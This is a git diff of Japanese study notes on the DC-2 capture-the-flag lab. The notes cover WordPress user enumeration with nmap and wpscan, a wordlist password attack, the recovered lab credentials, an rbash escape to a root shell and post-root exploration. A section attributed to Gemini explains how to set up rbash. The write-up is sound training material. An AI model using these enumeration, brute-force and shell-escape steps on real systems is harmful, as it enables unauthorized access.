@@ -39,10 +39,12 @@
 - それ以上は特にわからない
 
 ### Nmap NSE
-- nmap nseはnmapのスキャンを利用して、同時にスクリプトを実行できる。ここではwordPressのユーザを見つけることができる。
+- nmap nseはnmapのスキャンを利用して、同時にスクリプトを実行できる。ここではwordPressのユーザを見つけるスクリプトを使う。
 - nmapスクリプトで使えるのを探す。次ので検索すると出てくる
-  - `cat /usr/share/nmap/scripts/script.db | grep wordpress | grep user` 
+  - `cat /usr/share/nmap/scripts/script.db | grep wordpress | grep user`
+  - 何が検索できる?filenameの部分がスクリプトのコード
 - `nmap -p80 --script http-wordpress-users dc-2`
+  - `--script`でスクリプトを指定できる。`http-wordpress-users.nse`でもいい
   - `-p80`はなくてもいい 
 - userが3人であることがわかる
 - users.txtを作る
@@ -53,7 +55,10 @@
     tom 
     ```
 - http-wordpress-usersのスクリプト(プログラム)は`/usr/share/nmap/scripts`
-- (補足)wpscanでもできる cf690
+- (補足)wpscanでもできる
+  - `wpscan --url dc-2 -eu`
+  - $URLは使えない。ドメインネームでないとダメだからアドレスは使えない
+  - `-eu`は`-enumerate u`の略
 
 
 
@@ -69,8 +74,7 @@
 - `wpscan --url http://dc-2  -U users.txt -P cewl.txt`
 - または、こっちだとユーザネームもやってくるれる
 - `wpscan --url http://dc-2 --passwords cewl.txt`
-
-
+  - --passwordsのオプションのhelp見る。そこにもし、オプションに--usernameがなければ、ユーザネームの列挙も一緒にすると書いてある
 
 
 ### 認証情報
@@ -83,9 +87,9 @@
 |tom|parturient|
 
 ### WordPressのダッシュボードにアクセスする
-  - `http://192.168.56.104/wp-admin/`
-  - 二人のどちらかでNmapとHydraで得たuser,passwordを入力してアクセスする
-  - Flag2を見つける 
+- `http://dc-2/wp-admin/`
+- 二人のどちらかでNmapとHydraで得たuser,passwordを入力してアクセスする
+- Flag2を見つける 
 
 ### jerryでssh
 - jerryでログインするが失敗する。jerryはwordpressのパスワードとsshのパスワードを使い回していない
@@ -140,3 +144,52 @@
 - `!/bin/sh`  
 ### Flagを取得
   - `cd /root | cat final-flag.txt` 
+
+## (参考)root取得後
+- portの7744の設定
+  - /etc/ssh/sshd_config
+  - Port 7744
+- dc-2のドメインネームの設定
+  - wordpress特有のもの、本来はサーバであるapacheで設定する
+  - /var/www/html/wp-config.php
+  - `define('WP_HOME','http://dc-2');`
+- wordpressのadminのパスワードを探す
+  - `mysql -h localhost -u ユーザ名 -pパスワード`
+  - `show databases;`以下同文  
+- このサーバを作った経緯はどこでわかる
+  - cat /var/log/auth.log 
+- root,tom,jerryの過去のbashのコマンド見る
+
+
+
+## rbashの作成の仕方(geminiより)
+```
+制限付き環境の構築
+rbashは、ユーザーのホームディレクトリにある$PATH変数を参照します。安全な環境を構築するには、そのユーザーが実行できるコマンドをホワイトリスト方式で指定する必要があります。
+
+ユーザーのホームディレクトリに、実行可能なコマンドのシンボリックリンクを格納するディレクトリ（例: ~/bin）を作成します。
+
+Bash
+
+mkdir /home/<ユーザー名>/bin
+そのユーザーに許可したいコマンドへのシンボリックリンクを、この~/binディレクトリに作成します。
+
+Bash
+
+ln -s /usr/bin/ls /home/<ユーザー名>/bin/ls
+ln -s /usr/bin/cat /home/<ユーザー名>/bin/cat
+ユーザーの.bash_profileまたは.bashrcファイルで$PATHを~/binに限定します。
+
+ユーザーの.bash_profileまたは.bashrcファイルで$PATHを~/binに限定します。
+
+Bash
+
+echo 'PATH=$HOME/bin' >> /home/<ユーザー名>/.bash_profile
+ユーザーがこれらの設定ファイル（例: .bash_profile）を編集できないように、所有者と権限を変更します。
+
+Bash
+
+sudo chown root:root /home/<ユーザー名>/.bash_profile
+sudo chmod 444 /home/<ユーザー名>/.bash_profile
+
+```
